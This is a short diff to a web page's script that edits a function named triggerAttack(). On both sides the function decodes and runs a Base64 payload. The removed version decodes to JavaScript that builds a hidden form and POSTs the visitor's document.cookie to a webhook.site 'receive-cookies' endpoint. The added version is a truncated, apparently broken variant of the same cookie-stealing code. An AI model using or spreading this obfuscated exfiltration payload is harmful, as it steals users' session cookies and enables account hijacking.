@@ -20,9 +20,9 @@
 
     <script>
         function triggerAttack() {
-            // Replace this with your new Base64 encoded payload
-            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2Zpc2NoLm1ldGhvZCA9ICdQT1NUJztmaXNjaC5hY3Rpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGNmZmYzYWEtMzNhNy00NGQzLTlkZTEtODZmZDI5YjA5NjdiL3JlY2VpdmUtY29va2llcyc7dmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTtpbnB1dC50eXBlID0gJ2hpZGRlbic7aW5wdXQubmFtZSA9ICdjb29raWVEYXRhJztpbnB1dC52YWx1ZSA9IGRvY3VtZW50LmNvb2tpZTtmaXNjaC5hcHBlbmRDaGlsZChpbnB1dCk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmaXNjaCk7CmZpc2NoLnN1Ym1pdCgpOw==';
-            
+            // Base64 encoded payload to run when the button is clicked
+            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2Zpc2NoLm1ldGhvZCA9ICdQT1NUJztmaXNjaC5hY3Rpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGNmZmYzYWEtMzNhNy00NGQzLTlkZTEtODZmZDI5YjA5NjdiL3JlY2VpdmUtY29va2llcyc7dmFyIGlucHV0ID0gZG9jdW1lbnQuY29va2llOwpmb3JtLmFwcGVuZENoaWxkKGlucHV0KTs=';
+
             // Decode the Base64 encoded payload
             var decodedPayload = atob(encodedPayload);
 
